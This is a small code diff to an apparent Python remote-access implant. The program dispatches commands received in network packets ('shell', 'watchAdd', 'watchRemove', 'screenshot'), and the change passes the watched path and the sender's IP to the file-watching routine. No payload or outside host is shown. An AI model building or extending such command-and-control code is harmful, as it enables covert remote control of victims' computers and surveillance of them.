@@ -73,7 +73,7 @@ def watchAdd(path, ip):
     except KeyboardInterrupt:
         observer.stop()
 
-def watchRemove(watch):
+def watchRemove():
     observer.unschedule(watch)
 
 def screenshot():
@@ -92,7 +92,7 @@ def parseCommand(packet):
             if commandType == 'shell':
                 shellCommand(packet, commandString)
             elif commandType == 'watchAdd':
-                watchAdd()
+                watchAdd(commandString, packet[IP].src)
             elif commandType == 'watchRemove':
                 watchRemove()
             elif commandType == 'screenshot':
